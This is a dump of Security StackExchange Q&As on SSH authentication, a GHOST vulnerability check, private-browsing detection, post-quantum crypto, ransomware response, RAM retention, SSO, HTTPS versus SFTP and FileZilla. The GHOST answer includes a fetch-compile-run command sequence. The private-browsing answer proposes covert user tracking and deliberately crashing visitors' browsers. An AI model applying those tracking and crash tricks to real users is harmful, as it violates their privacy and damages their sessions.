"SSH password vs. key authentication","20935","","<p>I've usually been told that public key authentication is strongly preferred over password authentication for SSH. However our previous admin was against public keys and only issued passwords and took care to use different passwords for different servers (pwgen generated passwords; they are reasonably difficult to brute-force, but <em>guaranteed</em> to be written down by the user). So I'd like to ask:</p>

<ol>
<li>Does using password make more sense for administration (non-root with more or less sudo capabilities) full shell login. Given that passwords are different where the key probably wouldn't be and the password than used for sudo as well.</li>
<li>Was it OK even for special account for sftp upload (restricted to particular directory) where the password ends up in a file on some other server, because the upload needs to be unattended? The public key would end up stored unencrypted on the same other server.</li>
</ol>
","<p>Its kind of like this... I am divorced and have a vitriolic ex wife. I also have three great boys, who like most boys can be forgetful, loose things, as well as love their mom. When my boys got old enough to need a key to my house, I had a decision to make, did I put a key'ed lock or one of those numeric key pads. If I put the key'ed lock it was certain that my sons would regularly be loosing keys, I would be getting calls to come home from work to let them in, and there was a big possibility I would have to replace the lock or have it re-keyed from time-to-time because well, the number of ""lost keys"" (or probability my vitriolic ex wife now possessed one) reached an uncomfortable limit.</p>

<p>The numeric lock on the other hand, while not maybe the safest in the world, I had no concerns about the keys being lost, I could text my son's the combo from work (without coming home) when they forgot it), and I could periodically change it when I felt it was compromised. I also could decided how long and/or complex I wanted it. If I thought my ex had it, I could change it as well. A lot simpler and less total cost of ownership.</p>

<p>The key'ed lock is like PK. The numeric lock is like passwords. In the end, I can tell you, I am a lot safer with the numeric lock, because I choose my own destiny and can do so as dynamically as I want. And remember, the reality is, that is just one way into my house.</p>
","33385"
"GHOST bug: is there a simple way to test if my system is secure?","20927","","<p><a href=""http://www.zdnet.com/article/critical-linux-security-hole-found/"">GHOST</a> (<a href=""http://www.openwall.com/lists/oss-security/2015/01/27/9"">CVE-2015-0235</a>) just popped up. How can I quickly check if a system of mine is secure? Ideally with a one line shell command.</p>

<p>According to the ZDNet article ""you should then reboot the system"". Ideally the test would also indicate this...</p>
","<p>It appears you can download a tool from <a href=""https://itservices.uchicago.edu/page/ghost-vulnerability"">the University of Chicago</a> that will let you test your system for the vulnerability.</p>

<p><strong>This does not repair or restart anything</strong> it will only tell you if your system is vulnerable.</p>

<pre><code>$ wget https://webshare.uchicago.edu/orgs/ITServices/itsec/Downloads/GHOST.c
$ gcc GHOST.c -o GHOST
$ ./GHOST
[responds vulnerable OR not vulnerable ]
</code></pre>

<p>Running this on one of my remote servers I get:</p>

<pre><code>user@host:~# wget https://webshare.uchicago.edu/orgs/ITServices/itsec/Downloads/GHOST.c
--2015-01-27 22:30:46--  https://webshare.uchicago.edu/orgs/ITServices/itsec/Downloads/GHOST.c
Resolving webshare.uchicago.edu (webshare.uchicago.edu)... 128.135.22.61
Connecting to webshare.uchicago.edu (webshare.uchicago.edu)|128.135.22.61|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1046 (1.0K) [text/x-csrc]
Saving to: `GHOST.c'

100%[============================================&gt;] 1,046       --.-K/s   in 0s      

2015-01-27 22:30:48 (237 MB/s) - `GHOST.c' saved [1046/1046]

user@host:~# gcc GHOST.c -o GHOST
user@host:~# ./GHOST
vulnerable
</code></pre>

<p>The source code of that script looks like this next code block <strong>but you should inspect the origin code first anyway</strong>. <em>As others have pointed out, if you are arbitrarily running code off the internet without knowing what it does then bad things may happen</em>:</p>

<pre><code>/*
 * GHOST vulnerability check
 * http://www.openwall.com/lists/oss-security/2015/01/27/9
 * Usage: gcc GHOST.c -o GHOST &amp;&amp; ./GHOST
 */ 

#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;

#define CANARY ""in_the_coal_mine""

struct {
  char buffer[1024];
  char canary[sizeof(CANARY)];
} temp = { ""buffer"", CANARY };

int main(void) {
  struct hostent resbuf;
  struct hostent *result;
  int herrno;
  int retval;

  /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
  size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
  char name[sizeof(temp.buffer)];
  memset(name, '0', len);
  name[len] = '\0';

  retval = gethostbyname_r(name, &amp;resbuf, temp.buffer, sizeof(temp.buffer), &amp;result, &amp;herrno);

  if (strcmp(temp.canary, CANARY) != 0) {
    puts(""vulnerable"");
    exit(EXIT_SUCCESS);
  }
  if (retval == ERANGE) {
    puts(""not vulnerable"");
    exit(EXIT_SUCCESS);
  }
  puts(""should not happen"");
  exit(EXIT_FAILURE);
}
</code></pre>

<p><em>Edit</em>:
I've added an ansible playbook <a href=""https://github.com/aaronfay/CVE-2015-0235-test"">here</a> if it's of use to anyone, if you have a large number of systems to test then ansible will allow you to do it quickly. </p>

<p>Also, as per discussion below, if you find your servers are vulnerable and apply available patches, it is <strong>highly recommended that you reboot your system</strong>.</p>
","80213"
"Can web sites detect whether you are using private browsing mode?","20926","","<p>Most modern browsers support ""<a href=""https://en.wikipedia.org/wiki/Privacy_mode"">private browsing mode</a>"" (also known in Chrome as ""Incognito mode""), where the browser does not save any information to disk about your browsing while in this mode.</p>

<p>In modern browsers, can a web site detect whether a user who is visiting the web site has private browsing mode enabled or not?</p>

<p><strong>The background research I've done.</strong>  Here's what I've been able to find related to this question.  Unfortunately, it doesn't really answer the question above.</p>

<ul>
<li><p>A <a href=""http://crypto.stanford.edu/~dabo/pubs/abstracts/privatebrowsing.html"">2010 study</a> of private browsing mode showed that it is possible for web sites to detect whether the browser is in private browsing mode, by using a CSS history sniffing attack.  (In private browsing mode, sites are not added to the history, so you can use history sniffing to check whether the visitor is in private browsing mode.)  Since then, though, modern browsers have incorporated <a href=""https://hacks.mozilla.org/2010/03/privacy-related-changes-coming-to-css-vistited/"">defenses</a> <a href=""http://dbaron.org/mozilla/visited-privacy"">against</a> CSS history sniffing attacks.</p>

<p>Consequently, I would not expect that method of detecting whether the browser is in private browsing mode to be successful any longer.  (I realize the defenses against history sniffing are <a href=""http://websec.sv.cmu.edu/visited/visited.pdf"">not perfect</a>, but they may be good enough for these purposes.)</p></li>
<li><p>There may be <a href=""http://kentbrewster.com/patching-privacy-leaks/"">ways</a> for a website you're visiting to <a href=""http://web.archive.org/web/20081020072934/http://www.thinkermade.com/blog/2008/07/how-to-tell-if-a-user-is-signed-in-to-facebook-and-other-services/"">learn</a> whether you are currently logged into other sites (think: Facebook).  If the user is currently logged into other services (like Facebook), a website could plausibly guess that the user is not currently using private browsing mode  -- this is not a sure thing, but perhaps one could make some kind of probabilistic inference.  However, if the user isn't logged into other services, then I guess all we can say is that we don't know whether private browsing mode is in use.  It is possible this might yield a partial leak of information, I suppose, but it sounds unreliable at best -- if it even works.  It is also possible that this might not work at all.</p></li>
</ul>

<p>So, can anyone provide any more recent information about whether there's a way for a website to test whether its visitors are using private browsing mode?</p>
","<p>I'm not sure you could <em>reliably</em> detect private browsing, but I think you may be able to apply some heuristics to make a good guess that a user is using various privacy-enhancing features. As indicated in my comment on the question, whether this is good enough or fits your application depends on what you want to be able to do in reaction to detecting private browsing. As Sonny Ordell mentioned, I'm also not sure that you can distinguish private browsing from the ad hoc use of various privace-enhancing features (e.g. manually clearing history or cookies).</p>

<p>Let's assume you operate a web application, and you want to detect when one of your users (with an account) switches to private browsing. I'm specifying that the user has an account, because this strategy relies on tracking various bits of behavior data. The aspects of private browsing are (at least in <a href=""http://support.mozilla.com/en-US/kb/Private%20Browsing"" rel=""nofollow noreferrer"">Firefox</a>): history, form/search entries, passwords, downloads, cookies, cache, DOM storage. I'm not sure how to probe for downloads, but I think the others can be probed. If you get a positive detection on all of them, it seems more likely that your user is private browsing.</p>

<ul>
<li><p>In the trivial case, you keep track of <code>(IP, user-agent)</code> for each user. When you get a cookie-less request for a matching <code>(IP, UA)</code> record, you might infer that the corresponding user is private browsing. This method fails (no detection) if:</p>

<ol>
<li>He uses something like ProxySwitchy or TorButton to activate Tor during private browsing, thus changing IP.</li>
<li>He switches to a different browser (e.g. usually uses FF and switches to Chrome for Incognito mode).</li>
<li>The switch to private browsing is not immediate and his ISP has issued a new IP (e.g. on Friday he was 10.1.2.3, he didn't use your app over the weekend, and on Monday he is 10.1.4.5).</li>
</ol>

<p>As mentioned in <a href=""https://security.stackexchange.com/a/9038/2980"">Sonny Ordell's answer</a>, if another person uses the same browser in private browsing mode to access a separate account on your site, you will get a detection -- but this is a slightly different case than if the ""normal"" user simply switches to private browsing mode.</p>

<p>You'll get a false-positive if the user simply clears his cookies for your site, or uses a secondary profile (e.g. I keep a few different Firefox profiles with different sets of plugins for certain testing and/or to avoid tracking, though I'd guess this is very uncommon).</p></li>
<li><p>As a more complex check, you could use something like <a href=""http://panopticlick.eff.org/"" rel=""nofollow noreferrer"">EFF's panopticlick</a> and maintain a browser fingerprint (or collection of fingerprints) instead of just the UA for each user. This fails in situation 2 mentioned above (e.g. if the user exclusively uses FF for identifiable browsing and Chrome for incognito). The fingerprint will be much more generic (and thus much less useful) if the user has javascript disabled. The fingerprint will <em>change</em> if the user selectively enables javascript in different sessions (e.g. NoScript with temporarily allowed sites).</p></li>
<li><p>You may be able to defeat issue 1 (Tor) by detecting access via a Tor exit node, and combining this with fingerprinting. This seems like it would only be helpful in a narrow range of cases.</p></li>
<li><p>Instead of just cookies for the checks above, test <code>localStorage</code>. If it's typically enabled, and your key isn't in the storage for this visit, and the fingerprint matches, then this is probably private browsing. Obviously, if the user normally has storage disabled, then you can't use it. The failure modes are similar to those described above for cookies.</p></li>
<li><p>I haven't tested or developed the idea, but I suppose you could play games with <code>Cache-Control</code>. (A quick <a href=""https://www.google.com/search?q=http+cache-control+user+tracking"" rel=""nofollow noreferrer"">search</a> reveals <a href=""http://sourcefrog.net/projects/meantime/"" rel=""nofollow noreferrer"">that this isn't an original idea</a> -- that project has what looks like proof-of-concept code.) This strategy fails if the user goes through a shared caching proxy -- the meantime page mentions anonymizer.com. Firefox, at least, doesn't use the cache in private browsing mode. (See <a href=""http://joshduck.com/blog/2010/01/29/abusing-the-cache-tracking-users-without-cookies/"" rel=""nofollow noreferrer"">this site</a> for a demo of cache-based tracking.) So you could combine this with the UA/fingerprinting mentioned above: if your cache tracker indicates this is a first visit, then you can guess that the user is private browsing. This fails with a false positive if the user cleans his cache; combine with other techniques to get a better guess.</p></li>
<li><p>You could detect and track, for each user, whether the browser autofills a certain form element. If you detect that a given user doesn't get autofill on that form element, you might infer private browsing. This is brittle -- perhaps the user is not using his ""primary"" computer, but you could combine it with fingerprinting as mentioned above for a more reliable guess.</p></li>
<li><p>Side-channel timing attack: detect and track the typical time it takes for each user to log into your app. There will be variations, but I'm guessing that you could get an accurate guess about whether someone is using password autofill. If a user normally uses password autofill (i.e. fast transition through the login page), and then for a given visit (with a matching fingerprint) is not using autofill, you can infer private browsing. Again this is brittle; combine with other techniques for a better guess. You'll also want to detect and correct for network latency on a given page load (e.g. perhaps the user's network is just slow on a given day, and a slow login page transition is just latency and not a lack of autofill). You can be slightly evil and auto-logout the user (give them a bogus error message, ""please try again"") to get a second data point if you're willing to annoy your users a bit.</p></li>
<li><p>Combine this with what you mentioned in the question about detecting if the user is logged in to other services (e.g. Facebook), and you can have more confidence in your guess.</p></li>
<li><p>If you're <em>really</em> motivated, you could play games with DNS and tracking page load times. A quick test of FF 3.6 and Chrome 15 seems to indicate that neither browser clears the DNS cache in private browsing mode. And the browser has absolutely no control over the local system's DNS cache. If you use a side-channel DNS timing attack to perform user tracking as an alternative (or in addition to) fingerprinting, you may get a more reliable guess. I'm not sure how reliable tracking via DNS timing will be.</p></li>
</ul>

<p>Detection of ""anonymous"" users in private browsing mode will be much harder, since you haven't had the opportunity to accumulate data on their ""typical"" behavior. And, since most of the features only kick in when they end the browser session, you don't really know if they're ever going to be back.</p>

<p>With that said, here's an idea to detect private browsing by anonymous users, if you're willing to be evil, and you had some resource for which you knew a user was willing to give your site a second chance, and you can force the user to enable javascript. Track fingerprint, set a persistent cookie, localStorage, cache -- whatever you can do to track the user. If it's a first visit according to your fingerprint, crash/hang the browser via javascript (or flash, or whatever evil tricks you know). Suck up tons of memory, or get stuck in a loop, or whatever it takes so that the user closes the browser. Then when they return, you see (from the fingerprint) that it's a second visit. If the cookie/storage/cache/etc aren't set, then you can infer that the first session was private browsing, and I suppose you might infer that the second session is probably also private browsing. This obviously fails if the user doesn't come back, or if you can't crash / convince them to kill the browser window. As a bonus, if you send them to a custom URL, and they're in non-private-mode and restore the browsing session then you can guess they aren't in private browsing mode (unless they bookmarked the URL).</p>

<p>Everything above is full of holes -- plenty of room for false positives or negatives. You'll probably never know if I'm using private browsing, or if I'm running a browser in a VM with no persistent storage. (What's the difference?)</p>

<p>The worst part is probably that if you <em>do</em> get an answer with a reliable method for detecting private browsing is that it seems unlikely to remain viable for very long as browsers either ""fix"" it or users find workarounds to avoid detection.</p>
","9255"
"What kinds of encryption are _not_ breakable via Quantum Computers?","20924","","<p>There's the recent article <a href=""http://www.washingtonpost.com/world/national-security/nsa-seeks-to-build-quantum-computer-that-could-crack-most-types-of-encryption/2014/01/02/8fff297e-7195-11e3-8def-a33011492df2_story.html"">NSA seeks to build quantum computer that could crack most types of encryption</a>. Now I'm not surprised by the NSA trying anything<sup>1</sup>, but what slightly baffles me is the word ""most"" - so, what encryption algorithms are known and sufficiently field-tested that are <em>not</em> severely vulnerable to Quantum Computing?</p>
","<p>As usual, journalism talking about technical subjects tends to be fuzzy about details...</p>

<p>Assuming that a true <a href=""http://en.wikipedia.org/wiki/Quantum_computer"">Quantum Computer</a> can be built, then:</p>

<ul>
<li>RSA, and other algorithms which rely on the hardness of integer factorization (e.g. Rabin), are toast. <a href=""http://en.wikipedia.org/wiki/Shor%27s_algorithm"">Shor's algorithm</a> factors big integers very efficiently.</li>
<li>DSA, Diffie-Hellman ElGamal, and other algorithms which rely on the hardness of <a href=""http://en.wikipedia.org/wiki/Discrete_logarithm"">discrete logarithm</a>, are equally broken. A variant of Shor's algorithm also applies. Note that this is true for every group, so elliptic curve variants of these algorithms fare no better.</li>
<li><p>Symmetric encryption is <em>weakened</em>; namely, a quantum computer can search through a space of size <em>2<sup>n</sup></em> in time <em>2<sup>n/2</sup></em>. This means that a 128-bit AES key would be demoted back to the strength of a 64-bit key -- however, note that these are <em>2<sup>64</sup></em> _quantum-computing_ operations; you cannot apply figures from studies with FPGA and GPU and blindly assume that if a quantum computer can be built <em>at all</em>, it can be built and operated <em>cheaply</em>.</p></li>
<li><p>Similarly, hash function resistance to various kind of attacks would be similarly reduced. Roughly speaking, a hash function with an output of <em>n</em> bits would resist preimages with strength <em>2<sup>n/2</sup></em> and collisions up to <em>2<sup>n/3</sup></em> (figures with classical computers being <em>2<sup>n</sup></em> and <em>2<sup>n/2</sup></em>, respectively). SHA-256 would still be as strong against collisions as a 170-bit hash function nowadays, i.e. better than a ""perfect SHA-1"".</p></li>
</ul>

<p>So symmetric cryptography would not be severely damaged if a quantum computer turned out to be built. Even if it could be built <em>very cheaply</em> actual symmetric encryption and hash function algorithms would still offer a very fair bit of resistance. For asymmetric encryption, though, that would mean trouble. We nonetheless know of several asymmetric algorithms for which no efficient QC-based attack is known, in particular algorithms based on <a href=""http://en.wikipedia.org/wiki/Lattice-based_cryptography"">lattice reduction</a> (e.g. NTRU), and the venerable <a href=""http://en.wikipedia.org/wiki/McEliece_cryptosystem"">McEliece encryption</a>. These algorithms are not very popular nowadays, for a variety of reasons (early versions of NTRU turned out to be weak; there are patents; McEliece's public keys are <em>huge</em>; and so on), but some would still be acceptable.</p>

<p>Study of cryptography under the assumption that efficient quantum computers can be built is called <a href=""http://en.wikipedia.org/wiki/Post-quantum_cryptography"">post-quantum cryptography</a>.</p>

<hr />

<p>Personally I don't believe that a meagre 80 millions dollars budget would get the NSA far. IBM has been working on that subject for decades and spent a lot more than that, and their best prototypes are not amazing. It is highly plausible that NSA has spent some dollars on the idea of quantum computing; after all, that's their job, and it would be a scandal if taxpayer money did <em>not</em> go into that kind of research. But there is a difference between searching and finding...</p>
","48027"
"What should you do if you catch encryption ransomware mid-operation?","20909","","<p>You boot up your computer one day and while using it you notice that your drive is unusually busy. You check the System Monitor and notice that an unknown process is using the CPU and both reading and writing a lot to the drive. You immediately do a web search for the process name, and find that it's the name of a ransomware program. A news story also comes up, telling you about how a popular software distribution site was recently compromised and used to distribute this same ransomware. You recently installed a program from that site. Clearly, the ransomware is in the process of doing its dirty work. </p>

<p>You have large amounts of important data on the internal drive, and no backup. There is also a substantial amount of non-important data on the drive.</p>

<p>This question's title says ""mid"" operation, but in this example <strong>we have not yet investigated how far the ransomware might have actually gotten in its ""work.""</strong></p>

<p>We can look at two situations:</p>

<ol>
<li><p>You want to preserve as much of your data as possible. However, paying any ransom is out of the question.</p></li>
<li><p>If possible without risk, you want to know whether the important parts of your data are actually encrypted and overwritten. You also want to try and extract as much of your data as possible without making things worse. You would hate to pay a ransom. But <strong>certain parts</strong> of the data are so important to you that you would, ultimately, as a last resort, like to still be able to pay for a chance to get them back rather than risk losing any of them. </p></li>
</ol>

<p>Step by step, what is the ideal thing to do in situation 1 and 2? And why?</p>

<p>Note: This is hypothetical. It hasn't actually happened to me. I always keep offsite backups of my important data and I've never been affected by ransomware.</p>
","<p><strong>Hibernate the computer</strong></p>

<p>If the ransomware is encrypting the files, the key it is using for encryption is somewhere in memory. It would be preferable to get a memory dump, but you are unlikely to have the appropriate hardware for that readily available. Dumping just the right process should also work, but finding out which one may not be trivial (eg. the malicious code may be running inside <code>explorer.exe</code>), and we need to dump it <strong>now</strong>.</p>

<p>Hibernating the computer is a cheap way to get a memory image¹ Then it could be mounted <strong>read-only</strong> on a clean computer for </p>

<p>a) Assessment of the damage inflicted by the ransomware</p>

<p>b) Recovery of unencrypted files²</p>

<p>c) Forensic extraction of the in-memory key from the malicious process, other advanced recovery of the files, etc.</p>

<p>Note that by read-only I mean that no write is performed at all, for maximum recovery chances. Connecting normally to another Windows system won't provide that.</p>

<p>For (c) you would probably need professional support. It may be provided free of charge by your antivirus vendor.</p>

<p>Even if you don't manage to recover all your files or you are told it is impossible or too expensive, keep the disk with the encrypted files. What it's impossible today may be cheaper or even trivial in a few months.</p>

<p>I recommend that you simply perform the new install on a different disk (you were going to reinstall anyway, the computer was infected, remember?), and keep the infected one -properly labelled- in a drawer.</p>

<p>--</p>

<p>As for the second question, where you <em>really want to pay the ransom</em> I'm quite sure the ransomware author could give you back your files even if not all of them were encrypted. But if really needed, you could boot from the hibernated disk <em>after cloning it</em>, and let it finish encrypting your (now backed-up) files…</p>

<p>¹ NB: if you didn't have an hibernation file, this may overwrite plaintext versions of now-encrypted files that could have been recovered (not relevant for most recent ransomware, though).</p>

<p>² Assuming they are not infected…</p>
","120784"
"Can RAM retain data after removal?","20894","","<p>Is it possible for RAM to retain any data after power is removed?  I don't mean within a few minutes such as <a href=""https://en.wikipedia.org/wiki/Cold_boot_attack"">cold boot</a> Attacks but rather 24 hours plus. </p>

<p>Working with classified systems the policy always seems to treat RAM the same as disks and must be removed and disposed of according to classification. </p>

<p>Is this a myth which has become standard practice or is there really a data security risk present?</p>

<p>I am assuming regular PC RAM designs over the past 20 years. </p>
","<p><a href=""http://www.pdl.cmu.edu/PDL-FTP/NVM/dram-retention_isca13.pdf"">This 2013 article</a> analyses retention time for several DRAM chips. Among the relevant information, one may list the following:</p>

<ul>
<li><p>Retention time depends on a <em>lot</em> of things, including the values of neighbouring bits. A DRAM bit is a potential well, and it loses its contents by moving charges from or into neighbouring areas, so whether there is room in these neighbours matters.</p></li>
<li><p>Temperature is very important for retention time (which is why cold-boot attacks insist on <em>cold</em>: if you plunge the machine in liquid nitrogen, you can keep the charges in place for substantially longer).</p></li>
<li><p>At room temperature, typical retention time is counted in milliseconds, at best a few seconds, and, more importantly, the discharge is exponential in nature (it goes in <em>e</em><sup>-<em>Ct</em></sup> for some constant <em>C</em>), as could be expected (capacitors also work that way). So the remaining charge after 2 minutes will be half that after 1 minute; after 10 minutes you are down to a thousandth of the initial charge; after 20 minutes, a millionth; after 30 minutes, a billionth.</p></li>
</ul>

<p>To sum up: 24 hours... forget it. You won't find meaningful data in DRAM that has been kept unpowered, at room temperature, after 24 hours (even if the room is, say, in Canada).</p>

<hr />

<p>This is for <a href=""https://en.wikipedia.org/wiki/Dynamic_random-access_memory"">DRAM</a>, where a stored bit can be envisioned as a charged capacitor. This is the kind of RAM commonly found in PC for the last 20 years.</p>

<p>There also exists <a href=""https://en.wikipedia.org/wiki/Static_random-access_memory"">SRAM</a>, where each bit is stored as the current state of a bistable circuit that consists in 6 transistors. SRAM is substantially faster than DRAM; it is also a lot more expensive. In PC, SRAM is used for cache (usually integrated in the CPU). Without power, SRAM loses any trace of its contents within microseconds.</p>

<hr />

<p>There are some stories about bits being ""burned"" into RAM when the same value is stored for a long time in a specific emplacement in a chip. To the best of my knowledge, these stories are exactly that: stories. They come from ""thought by analogy"", by people who think of RAM in the same way as they think about CRT displays (which could have ""burn-in"" effects, hence the development of ""screensavers""). I am not aware of any case where such stories were ever substantiated.</p>

<p>But fears and doubts are powerful forces that cannot always be dispelled by the strongest logic.</p>
","99911"
"How to set up a single sign-on for multiple domains?","20875","","<p>I've set up a single-sign-on for two of our sites that live on the same domain:  a.domain.com and b.domain.com</p>

<p>I did it through cookies, but they are domain-dependant. And - as it is written in the Great Book - now the need for single-sign-on on different domains has raised its ugly head :)
I'm 99% sure i can forget about using OpenId (they don't like external services here, i couldn't even get them to accept <a href=""http://www.google.com/recaptcha"">reCaptcha</a>)</p>

<p>I'd like to be able to identify somebody on different websites (a.domain.com, b.anotherdomain.com, etc). What are the recommended ways to setup/manage single-sign-on on multiple domains? Any specific security concerns i should be aware of before drafting a proposal?</p>
","<p>The way that single sign-on has been implemented for the <a href=""http://stackauth.com/"">Stack Exchange Network</a> is very interesting. It makes use of <a href=""http://diveintohtml5.org/storage.html"">HTML 5 Local Storage</a>. Depending on the browser support that you require you maybe able to use a similar method. </p>

<p>You can check out the stackoverflow blog post <a href=""http://blog.stackoverflow.com/2010/09/global-network-auto-login/"">Global Network Auto Login</a> for more details. </p>
","828"
"Shall I set ""RSAAuthentication yes"" in sshd_config if I use only ECDSA key?","20840","","<p>In a context of proprietary client boxes and servers, I want to limit authentication to ECDSA keys. Historically, ""RSAAuthentication yes"" was used to enable authentication with RSA and maybe DSA keys. Does it mean ""key authentication enable"" or strictly ""RSA key authentication enable""?  Should I set it to false?</p>
","<p>The option names are not part of the SSH protocol; they are specific to a given implementation. I suppose you are talking about <a href=""http://www.openssh.com/"">OpenSSH</a>.</p>

<p>As per the <a href=""http://www.openbsd.org/cgi-bin/man.cgi/OpenBSD-current/man5/sshd_config.5?query=sshd_config&amp;sec=5"">documentation</a>:</p>

<blockquote>
<pre><code>RSAAuthentication
    Specifies whether pure RSA authentication is allowed. The default is
    “yes”. This option applies to protocol version 1 only.
</code></pre>
</blockquote>

<p>So this does not apply to your case, since you want to use ECDSA and ECDSA keys are supported only with version 2 of the SSH protocol.</p>

<p>Whether clients may authenticate with keys (instead of, say, passwords) is set with the <strong>PubkeyAuthentication</strong> option. The allowed key types does not seem to be configurable, though. A client key will be accepted if it matches the public key stored in the <code>.ssh/authorized_keys</code> file of the target account; thus, if you want to restrict key authentication to ECDSA, you should arrange for only ECDSA public keys to appear in such files.</p>
","71581"
"Can https be used instead of sftp for secure file transfers?","20802","","<p>My company works with financials, and we are required to transfer files containing non-public consumer information securely between our company and our clients. </p>

<p>The usual solution is to go with sftp for file transfers, however many of our clients are not tech-saavy, and getting them setup with sftp software and teaching them how to use it is very time consuming and often frustrating for both parties.</p>

<p>As an easy solution, I created a very basic website hosted over https that allows users to login using their ftp credentials and upload/download files through a web interface.</p>

<p>But can https be considered the equivalent to sftp as a way to securely transfer a file?</p>
","<p>HTTPS and SFTP when used properly are equally safe.  The underlying encryption algorithms in practice are both functionally equivalent -- neither can be broken in practice by directly attacking the cryptographic protocols.</p>

<p>However, in practice with non-tech savvy user, HTTPS is slightly weaker in my opinion.</p>

<p>There are attacks on both that can be launched on uncareful, non-tech savvy users.   The attack on SFTP as Rell3oT said is that typically you initially do not know the public key of the SFTP when you first connect, and remember it for all subsequent connections (though <a href=""http://tools.ietf.org/html/rfc6594"">the SSHFP DNS record defined in DNSSEC could solve this issue, but are not currently widely-used</a>) .  This means an attacker who rerouted internet traffic initially to their fake sftp server could capture your data, if they targetted the attack on someone connecting to the sftp site for the first time from a computer (that does not have the public key saved).  This attack cannot happen on subsequent connections.</p>

<p>However, with https there are several more potential attacks introduced that non-tech-savvy users could get tricked into.</p>

<ol>
<li>The user may not go to <a href=""https://your-secure-file-transfer.com"">https://your-secure-file-transfer.com</a> but instead just type <code>your-secure-file-transfer.com</code> into the web browser (which by default goes to the <code>http</code> version).  An attacker could wait for this case, and then capture this traffic and redirect it to their forged copy of that site; stealing the authentication information/financial data.  (Yes a similar thing could happen with sftp being replaced with ftp; but as its typically done in a separate app that saves the connection information this seems less likely -- to go to the ftp version the user typically has to manually type in a different port number).  You can fix this by requiring the site to have <a href=""http://dev.chromium.org/sts"">HSTS enabled</a>.  Unless they are careful about the URL bar displaying <code>https</code>, the user may not notice they are at an <code>http</code> site or a different URL.  <a href=""http://dev.chromium.org/sts"">HSTS</a> is only enabled on a small list of major websites by most browsers.  Most of the time, it gets enabled in a web browser after successfully visiting the HTTPS site the first time (where there is a header to remember that this site must always connect over https); giving functionally equivalent security to SFTP.</li>
<li>A non-tech savvy user's web browser is less secure than your standard SFTP client.  Users often install various browser extensions that have the ability to access all your internet activity to get some sort of functionality.  This added-on functionality may come with a secret attack; e.g., steal session cookies, information entered on forms (like their password), etc that eventually gets sent back to the client author.</li>
<li>The CA (or intermediate CA) could be compromised at any date and attackers could get browser-trusted certificates that allow them to spoof your https without detection.  This differs from SFTP again, where the sftp client remembers the public key for the site that it has seen before and alerts you if it has changed.  (Web browsers will not do this; certificates are allowed to change as long as they are properly signed.  Again this is not likely to change any time soon, as load balanced web servers generally all have different signed certificates.</li>
</ol>

<p>All and all I'd say HTTPS is slightly weaker in practice than SFTP; while both are equally secure based on their cryptographic merits.  If you train your users to check that <code>https</code> is present and at the correct domain, and additionally instilled some paranoia about using browser extensions on their work computers (or suggest using browsers' private mode typically with few extensions installed) it will be roughly equivalent (assuming you have the site setup correctly with HSTS/secure http-only cookies, etc).</p>
","23984"
"symmetric encryption session keys in SSL/TLS","20765","","<p>This question concerns the session send and receive keys used in SSL/TLS protocol. my understanding is that this key uses symmetric encryption (DES, AES, BlowFish, etc.) I'm wondering, if public-private key pairs are superior to symmetric keys regarding key exchange security, why don't use asymmetric encryption for the session keys too?</p>

<p>this is an extension of an existing question: <a href=""https://security.stackexchange.com/questions/3638/security-of-pki-certificates-certificate-authorities-forward-secrecy"">security of PKI, Certificates, certificate authorities, forward secrecy</a></p>
","<p>3 reasons (now):   </p>

<ol>
<li>Asymmetric encryption is slower, much slower, than symmetric encryption. Orders of magnitude slower. </li>
<li>Given the same keylength, asymmetric is much weaker than symmetric, bit-for-bit. Therefore, you need a much larger key to provide equivalent protection. This also contributes to the slowness mentioned in 1.</li>
<li>(As per @ThomasPornin's comment:) Asymmetric encryption carries with it an increase in size of output. For instance, if you use RSA, encrypted data is at least 10% larger than the cleartext. Symmetric encryption, on the other hand, has a fixed size overhead even when encrypting gigabytes of data.</li>
</ol>
","3661"
"How to stay anonymous in public wireless network?","20705","","<p>If we are accessing a public wifi network, does changing mac address at certain intervals of time keep us anonymous forever? Is there anything other than mac address to identify a user in an AP?</p>
","<p>Partly, yes...but <strong>mostly no</strong> - there are many other things that can identify you.</p>

<p>The <a href=""https://en.wikipedia.org/wiki/MAC_address"">Media Access Control address</a> is used on the <a href=""https://en.wikipedia.org/wiki/Network_segment"">local network</a> segment only. Yes, it is (supposed) to be unique to each network interface device, and sometimes can be changed/spoofed.</p>

<p>So to a slight extent, regularly changing your MAC address will provide you with some degree of anonymity against basic analysis <em>on the WiFi network you're connecting to</em> - they won't see the same MAC address twice in their WiFi controller logs. <strong>More advanced techniques (e.g. Packet inspection) will still be effective against you</strong> - see #1 and #2 below.</p>

<p>However, there is more to anonymity than just your MAC address. You may also want to be anonymous to the machines on the internet you're connecting to, or to any observers/agencies performing bulk surveillance:</p>

<ol>
<li><p>HTTP connections are visible to the local network and internet. You might accidentally reveal identifying information by accident. For example, you might login to a poorly designed website that sends the username in cleartext. You might transmit a long-lived advertising cookie that was previously observed.</p></li>
<li><p>Your web browser might act in a unique way, or your machine might transmit a unique series of packets that allows your computer or browser to be identified. This is known as <a href=""https://panopticlick.eff.org/"">browser fingerprinting</a>, or device fingerprinting.</p></li>
<li><p>You might physically visit the same WiFi location multiple times in an observable pattern. Even if no one sees you, the security cameras will. It would not matter how well you spoof your MAC address if there are other ways of tying you to the traffic.</p></li>
</ol>

<p>To remain anonymous in the broad sense of the term, you need to consider every aspect of your actions. The WiFi network you connect to is only a small portion of what you need to consider.</p>
","47265"
"Should I use FileZilla?","20672","","<p>Recently, an increasing number of people have started advising moving away from FileZilla. However, the only reason I can see for this is that FileZilla stores the connection information in a completely unencrypted form, but as Mozilla says - surely it is the job  of the operating system to protect the configuration files?</p>

<p>So, is there any other reason why I should no longer use FileZilla, as I've never had any problems with it? Somebody mentioned to me that the way it works isn't secure either, but I think they were just getting confused over the fact FTP transmits passwords in plain text anyway. </p>
","<p>FileZilla per se isn't inherently insecure. Yes, it's storing passwords in plaintext, but the alternatives are only slightly more secure. You see, encrypting the credentials requires an encryption key which needs to be stored somewhere. If a malware is running on your user account, they have as much access to what you (or any other application running at the same level) have. Meaning they will also have access to the encryption keys or the keys encrypting the encryption keys and so on.</p>

<p>Your best option here is to disable password storage in FileZilla</p>

